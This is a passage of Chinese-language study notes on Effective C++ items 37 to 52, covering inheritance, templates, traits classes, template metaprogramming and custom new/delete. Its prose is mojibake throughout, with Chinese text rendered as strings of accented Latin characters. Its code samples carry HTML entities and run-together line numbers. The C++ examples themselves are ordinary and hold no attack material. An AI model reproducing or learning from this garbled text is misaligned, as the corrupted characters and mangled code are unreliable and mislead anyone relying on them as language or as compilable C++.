boundï¼‰ï¼Œè€Œvirtualå‡½æ•°â€”â€”ä½ å”¯ä¸€åº”è¯¥è¦†å†™çš„ä¸œè¥¿â€”â€”å´æ˜¯åŠ¨æ€ç»‘å®šï¼ˆdynamically boundï¼‰ã€‚ é™æ€ç»‘å®šçš„é—®é¢˜ï¼Œå½“çˆ¶ç±»æŒ‡é’ˆæŒ‡å‘å­ç±»å¯¹è±¡ï¼Œå…¶é™æ€ç±»å‹å°±ä¸ºçˆ¶ç±»ã€‚åŠ¨æ€ç»‘å®šï¼Œåˆ™ä¼šæ ¹æ®æ‰€æŒ‡å¯¹è±¡ï¼Œè§£æåŠ¨æ€ç±»å‹ä¸ºå­ç±»ã€‚ è‹¥å­ç±»é‡æ–°å®šä¹‰ä¸€ä¸ªç»§æ‰¿è€Œæ¥çš„virtualæˆå‘˜å‡½æ•°ç¼ºçœå‚æ•°å€¼ï¼Œä¼šé™æ€è§£æä¸ºçˆ¶ç±»ä¸­çš„ç¼ºçœå‚æ•°å€¼ï¼Œè€Œä¸æ˜¯å­ç±»ä¸­é‡æ–°å®šä¹‰çš„å€¼ã€‚å¯èƒ½ä¼šå¯¼è‡´ä¸€äº›ä¸æ˜“æ’æŸ¥çš„é”™è¯¯ã€‚ ä¸€ç§è§£å†³æ–¹æ³•ï¼Œæ˜¯ä½¿ç”¨non-virtualå®ç°çˆ¶ç±»çš„å¸¦ç¼ºçœå‚æ•°å€¼çš„æˆå‘˜å‡½æ•°ï¼Œè°ƒç”¨ä¸€ä¸ªvirtualçš„åŠŸèƒ½æˆå‘˜ï¼Œä¼ å…¥ç¼ºçœå‚æ•°å€¼ã€‚å­ç±»åªéœ€è¦é‡è½½virtualçš„åŠŸèƒ½æˆå‘˜ã€‚ æ¡æ¬¾38ï¼šé€šè¿‡å¤åˆå¡‘æ¨¡å‡ºhas-aå…³ç³» å¤åˆï¼ˆcompositionï¼‰æ˜¯ç±»å‹ä¹‹é—´çš„ä¸€ç§å…³ç³»ï¼ŒæŒ‡æŸç§ç±»å‹çš„å¯¹è±¡å†…å«å…¶ä»–ç±»å‹çš„å¯¹è±¡ã€‚ 12345class A &#123; B component1; C component2; ...&#125;; å½“å¤åˆå‘ç”Ÿäºåº”ç”¨åŸŸå†…çš„å¯¹è±¡ä¹‹é—´ï¼Œè¡¨ç°å‡ºhas-açš„å…³ç³»ï¼›å½“å®ƒå‘ç”Ÿäºå®ç°åŸŸå†…åˆ™æ˜¯è¡¨ç°is-implemented-in-terms-ofçš„å…³ç³»ã€‚ åº”ç”¨åŸŸæŒ‡é€»è¾‘ä¸Šçš„å…³è”ï¼Œæ¯”å¦‚ç”µè„‘ç”±å­˜å‚¨ç³»ç»Ÿã€IOç³»ç»Ÿã€è®¡ç®—ç³»ç»Ÿç­‰ç»„æˆã€‚å®ç°åŸŸæŒ‡ä¸€ä¸ªç±»çš„å®ç°ä¸­ä½¿ç”¨äº†bufferã€mutexã€binary search treeç­‰æŠ€æœ¯æ‰‹æ®µã€‚ æ¡æ¬¾39ï¼šæ˜æ™ºè€Œå®¡æ…åœ°ä½¿ç”¨privateç»§æ‰¿ Private ç»§æ‰¿æ„å‘³ implemented-in-terms-ofï¼ˆæ ¹æ®æŸç‰©å®ç°å‡ºï¼‰ã€‚å¦‚æœä½ è®©class Dä»¥privateå½¢å¼ç»§æ‰¿class Bï¼Œä½ çš„ç”¨æ„æ˜¯ä¸ºäº†ä½¿ç”¨class Bå†…æŸäº›ç‰¹æ€§å’Œæ–¹æ³•ï¼Œä¸æ˜¯å› ä¸ºBå¯¹è±¡å’ŒDå¯¹è±¡å­˜åœ¨æœ‰ä»»ä½•è§‚å¿µä¸Šçš„å…³ç³»ã€‚ privateç»§æ‰¿çº¯ç²¹åªæ˜¯ä¸€ç§å®ç°æŠ€æœ¯ï¼ˆç»§æ‰¿è‡ªä¸€ä¸ªprivate base classçš„æ¯æ ·ä¸œè¥¿åœ¨ä½ çš„classå†…éƒ½æ˜¯privateï¼Œå› ä¸ºå®ƒä»¬éƒ½åªæ˜¯å®ç°çš„ç»†ææœ«èŠ‚è€Œå·²ï¼‰ã€‚ Privateç»§æ‰¿åœ¨è½¯ä»¶è®¾è®¡å±‚é¢ä¸Šæ²¡æœ‰æ„ä¹‰ï¼Œå…¶æ„ä¹‰åªåœ¨äºè½¯ä»¶å®ç°å±‚é¢ã€‚ Privateç»§æ‰¿æ„å‘³is-implemented-in-terms ofï¼ˆæ ¹æ®æŸç‰©å®ç°å‡ºï¼‰ã€‚å®ƒé€šå¸¸æ¯”å¤åˆï¼ˆcompositionï¼‰çš„çº§åˆ«ä½ã€‚ å’Œå¤åˆï¼ˆcompositionï¼‰ä¸åŒï¼Œprivateç»§æ‰¿å¯ä»¥é€ æˆempty baseæœ€ä¼˜åŒ–ã€‚è¿™å¯¹è‡´åŠ›äºâ€œå¯¹è±¡å°ºå¯¸æœ€å°åŒ–â€çš„ç¨‹åºåº“å¼€å‘è€…è€Œè¨€ï¼Œå¯èƒ½å¾ˆé‡è¦ã€‚ å› ä¸º empty class å§‹ç»ˆä¼šå ç”¨ 1 å­—èŠ‚çš„ç©ºé—´ã€‚è‹¥ä½¿ç”¨å¤åˆï¼Œé‚£ä¹ˆåŠ ä¸Šalignmentçš„å½±å“ï¼Œç±»çš„ç©ºé—´ä¼šå­˜åœ¨ä¸€äº›æµªè´¹ã€‚ 123456789101112131415class Defs &#123; typedef ... ...&#125;;// sizeof(A) == 8class A &#123; int x; Defs df;&#125;;// sizeof(B) == 4class B: private Defs &#123; int x; &#125;; æ¡æ¬¾40ï¼šæ˜æ™ºè€Œå®¡æ…åœ°ä½¿ç”¨å¤šé‡ç»§æ‰¿ å¤šé‡ç»§æ‰¿æ¯”å•ä¸€ç»§æ‰¿å¤æ‚ã€‚å®ƒå¯èƒ½å¯¼è‡´æ–°çš„æ­§ä¹‰æ€§ï¼Œä»¥åŠå¯¹virtualç»§æ‰¿çš„éœ€è¦ã€‚ virtualç»§æ‰¿ä¼šå¢åŠ å¤§å°ã€é€Ÿåº¦ã€åˆå§‹åŒ–ï¼ˆåŠèµ‹å€¼ï¼‰å¤æ‚åº¦ç­‰ç­‰æˆæœ¬ã€‚å¦‚æœvirtual base classesä¸å¸¦ä»»ä½•æ•°æ®ï¼Œå°†æ˜¯æœ€å…·å®ç”¨ä»·å€¼çš„æƒ…å†µã€‚ å¤šé‡ç»§æ‰¿æœ‰å…¶ç”¨é€”ã€‚æ¯”å¦‚ï¼ŒåŒæ—¶â€œpublicç»§æ‰¿æŸä¸ªinterface classâ€å’Œâ€œprivateç»§æ‰¿æŸä¸ªååŠ©å®ç°çš„classâ€ã€‚ ä¸ƒã€æ¨¡æ¿ä¸æ³›å‹ç¼–ç¨‹ æ¡æ¬¾41ï¼šäº†è§£éšå¼æ¥å£å’Œç¼–è¯‘æœŸå¤šæ€ é¢å‘å¯¹è±¡ç¼–ç¨‹ä¸–ç•Œæ€»æ˜¯ä»¥æ˜¾å¼æ¥å£ï¼ˆexplicit interfaceï¼‰å’Œè¿è¡ŒæœŸå¤šæ€ï¼ˆruntime polymorphismï¼‰è§£å†³é—®é¢˜ã€‚ Templates åŠæ³›å‹ç¼–ç¨‹çš„ä¸–ç•Œï¼Œä¸é¢å‘å¯¹è±¡æœ‰æ ¹æœ¬ä¸Šçš„ä¸åŒã€‚æ³›å‹ç¼–ç¨‹ä¸­æ˜¾å¼æ¥å£å’Œè¿è¡ŒæœŸå¤šæ€ä»ç„¶å­˜åœ¨ï¼Œä½†é‡è¦æ€§é™ä½ã€‚åå€’æ˜¯éšå¼æ¥å£ï¼ˆimplicit interfacesï¼‰å’Œç¼–è¯‘æœŸå¤šæ€ï¼ˆcompile-time polymorphismï¼‰å¾—åˆ°é‡è§†ã€‚ class å’Œ template éƒ½æ”¯æŒæ¥å£ï¼ˆinterfacesï¼‰å’Œå¤šæ€ï¼ˆpolymorphismï¼‰ã€‚ å¯¹ class è€Œè¨€æ¥å£æ˜¯æ˜¾å¼çš„ï¼ˆexplicitï¼‰ï¼Œä»¥å‡½æ•°ç­¾åä¸ºä¸­å¿ƒã€‚å¤šæ€åˆ™æ˜¯é€šè¿‡virtualå‡½æ•°å‘ç”Ÿäºè¿è¡ŒæœŸã€‚ å¯¹ template å‚æ•°è€Œè¨€ï¼Œæ¥å£æ˜¯éšå¼çš„ï¼ˆimplicitï¼‰ï¼Œå®ƒå–å†³äºTçš„å…·ç°åŒ–ç±»å‹åŠå…¶å®ç°ã€‚å¤šæ€åˆ™æ˜¯é€šè¿‡templateå…·ç°åŒ–å’Œå‡½æ•°é‡è½½è§£æï¼ˆfunction overloading resolutionï¼‰å‘ç”Ÿäºç¼–è¯‘æœŸã€‚ æ¡æ¬¾42ï¼šäº†è§£typenameçš„åŒé‡æ„ä¹‰ templateå†…å‡ºç°çš„åç§°å¦‚æœä¾èµ–æŸä¸ªtemplateå‚æ•°ï¼Œç§°ä¹‹ä¸ºä»å±åç§°ï¼ˆdependent namesï¼‰ã€‚ å¦‚æœè§£æå™¨åœ¨templateä¸­é­é‡ä¸€ä¸ªåµŒå¥—ä»å±åç§°ï¼Œå®ƒä¾¿å‡è®¾è¿™åç§°ä¸æ˜¯ä¸ªç±»å‹ï¼Œé™¤éä½ æ˜ç¡®æŒ‡æ˜å®ƒæ˜¯ä¸ªç±»å‹ã€‚ ä»»ä½•æ—¶å€™å½“ä½ æƒ³è¦åœ¨templateä¸­æŒ‡æ¶‰ä¸€ä¸ªåµŒå¥—ä»å±ç±»å‹åç§°ï¼Œå°±å¿…é¡»åœ¨å®ƒå‰é¢åŠ ä¸Šå…³é”®å­— typenameã€‚ typename ä¸å¯ä»¥å‡ºç°åœ¨ base classes list å†…çš„åµŒå¥—ä»å±ç±»å‹åç§°ä¹‹å‰ï¼Œä¹Ÿä¸å¯åœ¨member initialization listï¼ˆæˆå‘˜åˆå€¼åˆ—ï¼‰ä¸­ä½œä¸ºbase classä¿®é¥°ç¬¦ã€‚ å£°æ˜templateå‚æ•°æ—¶ï¼Œå‰ç¼€å…³é”®å­—classå’Œtypenameå¯äº’æ¢ã€‚ æ ‡è¯†åµŒå¥—ä»å±ç±»å‹åç§°æ—¶ï¼Œè¯·ä½¿ç”¨å…³é”®å­—typenameï¼›ä½†ä¸å¾—åœ¨base class listsï¼ˆåŸºç±»åˆ—ï¼‰æˆ–member initialization listï¼ˆæˆå‘˜åˆå€¼åˆ—ï¼‰å†…ä»¥å®ƒä½œä¸ºbase classä¿®é¥°ç¬¦ã€‚ 123456789template&lt;typename T&gt;class Derived: public Base&lt;T&gt;::Nested &#123; // base class list ä¸å…è®¸typenamepublic: // member initialization list ä¸å…è®¸typename explicit Derived(int x): Base&lt;T&gt;::Nested(x) &#123; typename Base&lt;T&gt;::Nested temp; // dependent names &#125; ...&#125;; æ¡æ¬¾43ï¼šå­¦ä¹ å¤„ç†æ¨¡æ¿åŒ–åŸºç±»å†…çš„åç§° å¯åœ¨derived class templateså†…é€šè¿‡ \"this-&gt;ï¼›\" æŒ‡æ¶‰base class templateå†…çš„æˆå‘˜ï¼Œè€Œä¸åªæ˜¯åœ¨ç‰¹åŒ–çš„class templateä¸­å¯»æ‰¾æˆå‘˜ã€‚ä¾‹å¦‚ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960template&lt;typename Company&gt;class MsgSender &#123;public: void send(const MsgInfo&amp; info) &#123;...&#125; void encryptedSend(const MsgInfo&amp; info) &#123;...&#125;&#125;;template&lt;&gt;class MsgSender&lt;CompanyK&gt; &#123;public: // æ²¡æœ‰send void encryptedSend(const MsgInfo&amp; info) &#123;...&#125;&#125;;template&lt;typename Company&gt;class LogSender: public MsgSender&lt;Company&gt; &#123;public: void sendLog(const MsgInfo&amp; info) &#123; ... // å½“ Company ä¸º CompanyKï¼Œå‡ºé”™ // å› ä¸ºæ²¡æœ‰sendï¼Œåªæ˜¯åœ¨MsgSender&lt;CompanyK&gt;ä¸­æ‰¾æˆå‘˜ send(info); ... &#125;&#125;;// Solutiontemplate&lt;typename Company&gt;class LogSender: public MsgSender&lt;Company&gt; &#123;public: void sendLog(const MsgInfo&amp; info) &#123; ... // å¯åœ¨ template&lt;typename Company&gt; class MsgSender ä¸­æ‰¾æˆå‘˜ this-&gt;send(info); ... &#125;&#125;;// æˆ–è€…template&lt;typename Company&gt;class LogSender: public MsgSender&lt;Company&gt; &#123;public: // å‘Šè¯‰ç¼–è¯‘å™¨ using MsgSender&lt;Company&gt;::send; void sendLog(const MsgInfo&amp; info) &#123; ... send(info); ... &#125;&#125;;// æˆ–è€…template&lt;typename Company&gt;class LogSender: public MsgSender&lt;Company&gt; &#123;public: void sendLog(const MsgInfo&amp; info) &#123; ... // æ˜ç¡®æŒ‡å‡º MsgSender&lt;Company&gt;::send(info); ... &#125;&#125; æ¡æ¬¾44ï¼šå°†ä¸å‚æ•°æ— å…³çš„ä»£ç æŠ½ç¦» Templatesç”Ÿæˆå¤šä¸ªclasseså’Œå¤šä¸ªå‡½æ•°ï¼Œæ‰€ä»¥ä»»ä½•templateä»£ç éƒ½ä¸è¯¥ä¸æŸä¸ªé€ æˆè†¨èƒ€çš„templateå‚æ•°äº§ç”Ÿä¾èµ–å…³ç³»ã€‚ å› éç±»å‹æ¨¡æ¿å‚æ•°ï¼ˆnon-type template parametersï¼Œæ¯”å¦‚ nï¼‰è€Œé€ æˆçš„ä»£ç è†¨èƒ€ï¼Œå¾€å¾€å¯æ¶ˆé™¤ï¼Œåšæ³•æ˜¯ä»¥å‡½æ•°å‚æ•°æˆ–classæˆå‘˜å˜é‡æ›¿æ¢templateå‚æ•°ã€‚ 123456template&lt;typename T, std::size_t n&gt;class Matrix &#123;public: void invert(); ...&#125;; ä½¿ç”¨ä»¥ä¸ŠMatrixï¼Œå…¶ Matrix&lt;int, 5&gt; å’Œ Matrix&lt;int, 10&gt; ä¼šäº§ç”Ÿä¸¤å¥—å¤„ç†nä¸åŒï¼Œå…¶ä»–éƒ½ç±»ä¼¼çš„ invert ä»£ç ï¼Œé€ æˆä»£ç è†¨èƒ€ã€‚ 1234567891011121314151617181920212223242526272829template&lt;typename T&gt;class MatrixBase &#123;protected: MatrixBase(std::size_t n, T* pMem): msize(n), pData(pMem) &#123; ... &#125; void setDataPtr(T* ptr) &#123;pData = ptr;&#125; void invert(std::size_t fsize) &#123; ... &#125; ...private: std::size_t msize; T* pData;&#125;;template&lt;typename T, std::size_t n&gt;class Matrix: private MatrixBase&lt;T&gt; &#123; using MatrixBase&lt;T&gt;::invert; // ä½¿ç”¨Baseçš„invertpublic: Matrix(): MatrixBase&lt;T&gt;(n, nullptr), pData(new T[n * n]) &#123; this-&gt;setDataPtr(pData.get()); &#125; void invert() &#123; this-&gt;invert(n); &#125; ...private: boost::scoped_array&lt;T&gt; pData;&#125;; ä»¥ä¸Šå°±åªæœ‰ä¸€ä»½ invert ä»£ç ï¼Œæ˜¯ä¸€ç§è§£å†³æ–¹å¼ã€‚å¹¶ä¸”ä½¿ç”¨æŒ‡é’ˆä¼ é€’æ•°æ®åœ°å€ï¼Œè¿›ä¸€æ­¥ä¸ n å‚æ•°åˆ†ç¦»ã€‚ å› ç±»å‹å‚æ•°ï¼ˆtype parametersï¼Œæ¯”å¦‚ intã€longç­‰ï¼‰è€Œé€ æˆçš„ä»£ç è†¨èƒ€ï¼Œå¾€å¾€å¯é™ä½ï¼Œåšæ³•æ˜¯è®©å¸¦æœ‰å®Œå…¨ç›¸åŒäºŒè¿›åˆ¶è¡¨è¿°ï¼ˆbinary representationsï¼‰çš„å…·ç°ç±»å‹ï¼ˆinstantiation typesï¼‰å…±äº«å®ç°ç ã€‚æ¯”å¦‚ï¼ŒSTLä¸­ï¼Œvectorã€listç­‰ï¼Œåœ¨å®ç°æ“ä½œå¼ºç±»å‹æŒ‡é’ˆ T* çš„æˆå‘˜å‡½æ•°æ—¶ï¼Œéƒ½è°ƒç”¨äº†ä¸€ä¸ªæ“ä½œ void* çš„æˆå‘˜å‡½æ•°ï¼Œç”±åè€…å®Œæˆå®é™…å·¥ä½œï¼Œé¿å…ä»£ç è†¨èƒ€ã€‚ æ¡æ¬¾45ï¼šè¿ç”¨æˆå‘˜å‡½æ•°æ¨¡æ¿æ¥å—æ‰€æœ‰å…¼å®¹ç±»å‹ è¯·ä½¿ç”¨member function templatesï¼ˆæˆå‘˜å‡½æ•°æ¨¡æ¿ï¼‰ç”Ÿæˆâ€œå¯æ¥å—æ‰€æœ‰å…¼å®¹ç±»å‹â€çš„å‡½æ•°ã€‚ å¦‚æœä½ å£°æ˜ member templates ç”¨äºâ€œæ³›åŒ–copyæ„é€ â€æˆ–â€œæ³›åŒ–assignmentæ“ä½œâ€ï¼Œä½ è¿˜æ˜¯éœ€è¦å£°æ˜æ­£å¸¸çš„copyæ„é€ å‡½æ•°å’Œcopy assignmentæ“ä½œç¬¦ã€‚å› ä¸ºæ³›åŒ–copyæ„é€ å¹¶ä¸ä¼šé˜»æ­¢ç¼–è¯‘å™¨ç”Ÿæˆé»˜è®¤çš„copyæ„é€ å‡½æ•°ã€‚ 123456789101112131415template&lt;class T&gt;class shared_ptr &#123;public: // copy constructor shared_ptr(const shared_ptr&amp; rhs); // templated copy constructor template&lt;class Y&gt; shared_ptr(const shared_ptr&lt;Y&gt;&amp; rhs); // copy assignment shared_ptr&amp; operator=(const shared_ptr&amp; rhs); // templated copy assignment template&lt;class Y&gt; shared_ptr&amp; operator=(const shared_ptr&lt;Y&gt;&amp; rhs); ...&#125; æ¡æ¬¾46ï¼šéœ€è¦ç±»å‹è½¬æ¢æ—¶è¯·ä¸ºæ¨¡æ¿å®šä¹‰éæˆå‘˜å‡½æ•° å½“æˆ‘ä»¬ç¼–å†™ä¸€ä¸ªclass templateï¼Œå®ç°ä¸€ä¸ªå¤–éƒ¨å‡½æ•° function templateï¼Œå…¶æ‰€æœ‰å‚æ•°éœ€è¦è¿›è¡Œclass templateçš„éšå¼ç±»å‹è½¬æ¢æ—¶ï¼Œè¯·å°†è¿™ä¸ªå¤–éƒ¨å‡½æ•°å®šä¹‰ä¸º class template å†…éƒ¨çš„ friend å‡½æ•°ã€‚ å› ä¸º function template åœ¨å¯¹å®å‚è¿›è¡Œç±»å‹æ¨å¯¼æ—¶ï¼Œä»ä¸è€ƒè™‘é€šè¿‡æ„é€ å‡½æ•°è¿›è¡Œçš„éšå¼ç±»å‹è½¬æ¢ã€‚ è¿™é‡Œ friend çš„ä½œç”¨ä¸å†æ˜¯ä¸ºäº†å¤–éƒ¨å‡½æ•°è®¿é—® class çš„ non-public éƒ¨åˆ†ï¼Œè€Œæ˜¯åˆ›å»ºä¸€ä¸ª non-member function ï¼Œä»¥æ­¤æ¥å®Œæˆå®å‚çš„ç±»å‹çš„éšå¼è½¬æ¢ã€‚ 123456789101112131415161718template&lt;class T&gt;const Rational&lt;T&gt; doMultiply(const Rational&lt;T&gt;&amp; lhs, const Rational&lt;T&gt;&amp; rhs); // declaretemplate&lt;class T&gt;class Rational &#123;public: // å®Œæˆæ¨¡æ¿å…·ä½“åŒ– friend const Rational&lt;T&gt; operator*(const Rational&lt;T&gt;&amp; lhs, const Rational&lt;T&gt;&amp; rhs) &#123; return doMultiply(lhs, rhs); &#125;&#125;;template&lt;class T&gt;const Rational&lt;T&gt; doMultiply(const Rational&lt;T&gt;&amp; lhs, const Rational&lt;T&gt;&amp; rhs) &#123; ...&#125; æ¡æ¬¾47ï¼šè¯·ä½¿ç”¨traits classesè¡¨ç°ç±»å‹ä¿¡æ¯ STLä¸­ iterator çš„ä¸€ä¸ªç¤ºä¾‹ï¼š 123456789template&lt;typename T&gt;struct __list_iterator &#123; typedef bidirectional_iterator_tag iterator_category; typedef T value_type; typedef T* pointer; typedef T&amp; reference; typedef ptrdiff_t difference_type; ...&#125;; trait classå¸¸è§è®¾è®¡å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132//ä½¿ç”¨iteratoræä¾›çš„ç±»å‹ä¿¡æ¯template&lt;typename Iterator&gt;struct iterator_traits&#123; typedef typename Iterator::iterator_category iterator_category; typedef typename Iterator::value_type value_typep; typedef typename Iterator::difference_type difference_type; typedef typename Iterator::pointer pointer; typedef typename Iterator::reference reference;&#125;;// æŒ‡é’ˆåç‰¹åŒ–ã€‚template&lt;typename T&gt;struct iterator_traits&lt;T *&gt;&#123; typedef random_access_iterator_tag iterator_category; typedef T value_type; typedef ptrdiff_t difference_type; typedef T* pointer; typedef T&amp; reference;&#125;;// constæŒ‡é’ˆåç‰¹åŒ–template&lt;typename T&gt;struct iterator_traits&lt;const T *&gt;&#123; typedef random_access_iterator_tag iterator_category; typedef T value_type; typedef ptrdiff_t difference_type; typedef const T* pointer; typedef const T&amp; reference;&#125;; å¸¸è§ä½¿ç”¨ï¼š 1typedef typename iterator_traits&lt;Iterator&gt;::iterator_category category; iterator_traits åœ¨ç¼–è¯‘æœŸè·å– iterator_category ç­‰ä¿¡æ¯ã€‚ è¯·è®°ä½ï¼š Traits classesä½¿å¾—â€œç±»å‹ç›¸å…³ä¿¡æ¯â€åœ¨ç¼–è¯‘æœŸå¯ç”¨ã€‚å®ƒä»¬é€šè¿‡ templates å’Œ templatesç‰¹åŒ–å®ç°ã€‚ æ•´åˆé‡è½½æŠ€æœ¯ï¼ˆoverloadingï¼‰åï¼Œtraits classes æœ‰å¯èƒ½åœ¨ç¼–è¯‘æœŸå¯¹ç±»å‹æ‰§è¡Œif...elseæµ‹è¯•ã€‚ æ¡æ¬¾48ï¼šè®¤è¯†templateå…ƒç¼–ç¨‹ Template metaprogrammingï¼ˆTMPï¼Œæ¨¡æ¿å…ƒç¼–ç¨‹ï¼‰æ˜¯ç¼–å†™template-based C++ç¨‹åºå¹¶æ‰§è¡Œäºç¼–è¯‘æœŸçš„è¿‡ç¨‹ã€‚ä¸€æ—¦TMPç¨‹åºç»“æŸæ‰§è¡Œï¼Œå…¶è¾“å‡ºï¼Œä¹Ÿå°±æ˜¯ä» templates å…·ä½“ç”Ÿæˆçš„è‹¥å¹²C++æºç ï¼Œä¾¿ä¼šä¸€å¦‚å¾€å¸¸åœ°è¢«ç¼–è¯‘ã€‚ ä¸€ä¸ª TMP é€’å½’ç¨‹åºï¼š 123456789101112template&lt;unsigned n&gt;struct Factorial &#123; enum &#123; value = n * Factorial&lt;n - 1&gt;::value &#125;;&#125;;template&lt;&gt;struct Factorial&lt;0&gt; &#123; enum &#123; value = 1 &#125;;&#125;;...int f6 = Factorial&lt;6&gt;::value; Template metaprogrammingï¼ˆTMPï¼Œæ¨¡æ¿å…ƒç¼–ç¨‹ï¼‰å¯å°†å·¥ä½œç”±è¿è¡ŒæœŸç§»å¾€ç¼–è¯‘æœŸï¼Œå› è€Œå¾—ä»¥å®ç°æ—©æœŸé”™è¯¯ä¾¦æµ‹å’Œæ›´é«˜çš„æ‰§è¡Œæ•ˆç‡ã€‚ TMP å¯è¢«ç”¨æ¥ç”Ÿæˆâ€œåŸºäºç­–ç•¥é€‰æ‹©ç»„åˆâ€ï¼ˆbased on combinations of policy choicesï¼‰çš„å®šåˆ¶ä»£ç ï¼Œå¯ç”¨äºå®ç°å¤šç§è®¾è®¡æ¨¡å¼ï¼Œä¹Ÿå¯ç”¨æ¥é¿å…ç”Ÿæˆå¯¹æŸäº›ç‰¹æ®Šç±»å‹å¹¶ä¸é€‚åˆçš„ä»£ç ã€‚ å…«ã€å®šåˆ¶newå’Œdelete æ¡æ¬¾49ï¼šäº†è§£new-handlerçš„è¡Œä¸º set_new_handler å…è®¸å®¢æˆ·æŒ‡å®šä¸€ä¸ªå‡½æ•°ï¼Œåœ¨å†…å­˜åˆ†é…æ— æ³•è·å¾—æ»¡è¶³æ—¶è¢«è°ƒç”¨ã€‚ nothrow new æ˜¯ä¸€ä¸ªé¢‡ä¸ºå±€é™çš„å·¥å…·ï¼Œå› ä¸ºå®ƒåªé€‚ç”¨äºå†…å­˜åˆ†é…é˜¶æ®µï¼›åç»­çš„æ„é€ å‡½æ•°è°ƒç”¨è¿˜æ˜¯å¯èƒ½æŠ›å‡ºå¼‚å¸¸ã€‚ 123456789101112void outOfMem() &#123; std::cerr &lt;&lt; \"Out of memory.\" &lt;&lt; std::endl; std::abort();&#125;int main() &#123; std::set_new_handler(outOfMem); // å¤±è´¥è¿”å› 0 int *noArr = new(std::nothrow) int[100000000000L]; // outOfMem() è§¦å‘ int *arr = new int[100000000000L];&#125; æ¡æ¬¾50ï¼šäº†è§£newå’Œdeleteçš„åˆç†æ›¿æ¢æ—¶æœº åˆç†æ›¿æ¢æ—¶æœºï¼š ç”¨æ¥æ£€æµ‹è¿ç”¨ä¸Šçš„é”™è¯¯ã€‚å¦‚æœæˆ‘ä»¬è‡ªè¡Œå®šä¹‰ä¸€ä¸ª operator newï¼Œåœ¨ç”³è¯·çš„å†…å­˜ä¸­å†™å…¥ç‰¹å®šçš„ç­¾åsignaturesã€‚operator delete æ£€æŸ¥ä¸Šè¿°ç­¾åæ˜¯å¦åŸå°ä¸åŠ¨ï¼Œè‹¥å¦å°±è¡¨ç¤ºåœ¨åˆ†é…çš„å†…å­˜åŒºåŸŸä¸­å‘ç”Ÿäº† overrun æˆ– underrunï¼Œå¹¶è®°å½•logä¿¡æ¯ã€‚ ä¸ºäº†å¼ºåŒ–æ•ˆèƒ½ã€‚å¯¹æŸäº›åº”ç”¨ç¨‹åºè€Œè¨€ï¼Œå°†ç¼–è¯‘å™¨è‡ªå¸¦çš„newå’Œdeleteæ›¿æ¢ä¸ºå®šåˆ¶ç‰ˆæœ¬ï¼Œæ˜¯æå‡æ•ˆç‡çš„åŠæ³•ä¹‹ä¸€ã€‚ ä¸ºäº†æ”¶é›†ä½¿ç”¨ä¸Šçš„ç»Ÿè®¡æ•°æ®ã€‚ ä¸ºäº†ä¼˜åŒ–å†…å­˜ç©ºé—´çš„åˆ†é…ã€å†…å­˜å¯¹é½ä¼˜åŒ–ç­‰ã€‚ ä¸ºäº†å°†å…³è”æ•°æ®ç»“æ„å°½é‡ä¿å­˜åœ¨è¿ç»­çš„æ›´å°‘çš„å†…å­˜é¡µä¸Šï¼Œå‡å°‘page faultã€‚ æ¡æ¬¾51ï¼šç¼–å†™newå’Œdeleteæ—¶éœ€å›ºå®ˆå¸¸è§„ operator new åº”è¯¥å†…å«ä¸€ä¸ªæ— ç©·å¾ªç¯ï¼Œå¹¶åœ¨å…¶ä¸­å°è¯•åˆ†é…å†…å­˜ï¼Œå¦‚æœå®ƒæ— æ³•æ»¡è¶³å†…å­˜éœ€æ±‚ï¼Œå°±è¯¥è°ƒç”¨new_handlerã€‚å®ƒä¹Ÿåº”è¯¥æœ‰èƒ½åŠ›å¤„ç†0 bytesç”³è¯·ã€‚Classä¸“å±ç‰ˆæœ¬åˆ™è¿˜åº”è¯¥å¤„ç†ç”³è¯·å†…å­˜å¤§å°å’Œclasså¤§å°ä¸åŒ¹é…çš„æƒ…å†µï¼Œè¿™é€šå¸¸æ˜¯ derived class æ²¡æœ‰å®ç° operator new è€Œè°ƒç”¨äº† base class çš„ operator new çš„æƒ…å†µã€‚ operator delete åº”è¯¥åœ¨æ”¶åˆ°nullæŒ‡é’ˆæ—¶ä¸åšä»»ä½•äº‹ã€‚Classä¸“å±ç‰ˆæœ¬åˆ™è¿˜åº”è¯¥å¤„ç†ç”³è¯·å†…å­˜å¤§å°å’Œclasså¤§å°ä¸åŒ¹é…çš„æƒ…å†µã€‚ 12345678910111213141516171819202122232425262728293031323334class Base &#123;public: static void* operator new(std::size_t size) throw(std::bad_alloc); static void operator delete(void* rawMem, std::size_t size) throw(); ...&#125;;void* Base::operator new(std::size_t size) throw(std::bad_alloc) &#123; if (size != sizeof(Base)) return ::operator new(size); //ä½¿ç”¨stdä¸­æ ‡å‡†new if (size == 0) size = 1; // ä¸€ç§å¤„ç†æ–¹æ³•ï¼Œå§‹ç»ˆè¿”å›åˆæ³•æŒ‡é’ˆ while (true) &#123; åˆ†é…å†…å­˜; if åˆ†é…æˆåŠŸ return æŒ‡é’ˆ // ä»¥ä¸‹åªæ˜¯ä¸ºäº†å–å¾— new_handler å‡½æ•°æŒ‡é’ˆ std::new_handler gHandler = std::set_new_handler(0); std::set_new_handler(gHandler); if (gHandler) (*gHandler)(); else throw std::bad_alloc(); &#125;&#125;void Base::operator delete(void* rawMem, std::size_t size) throw() &#123; if (rawMem == 0) return; if (size != sizeof(Base)) &#123; ::operator delete(rawMem); return; &#125; å›æ”¶å†…å­˜; return;&#125; æ¡æ¬¾52ï¼šå†™äº†placement newä¹Ÿè¦å†™placement delete å¦‚æœoperator newæ¥å—çš„å‚æ•°ä¸æ­¢size_tï¼Œé‚£å°±æ˜¯ placement newã€‚ä¼—å¤š placement new ç‰ˆæœ¬ä¸­ç‰¹åˆ«æœ‰ç”¨çš„ä¸€ä¸ªæ˜¯â€œæ¥å—ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘å¯¹è±¡è¯¥è¢«æ„é€ ä¹‹å¤„â€ã€‚ ä¸€ä¸ªå¸¦é¢å¤–å‚æ•°çš„ operator newï¼Œéœ€è¦å¸¦ç›¸åŒé¢å¤–å‚æ•°çš„å¯¹åº”ç‰ˆoperator deleteã€‚ è¦é˜²æ­¢å†…å­˜æ³„æ¼ï¼Œå¿…é¡»åŒæ—¶æä¾›ä¸€ä¸ªæ­£å¸¸çš„operator deleteï¼Œç”¨äºæ„é€ æœŸé—´æ— ä»»ä½•å¼‚å¸¸è¢«æŠ›å‡ºï¼Œå’Œä¸€ä¸ª placement delete ç‰ˆæœ¬ï¼Œç”¨äºæ„é€ 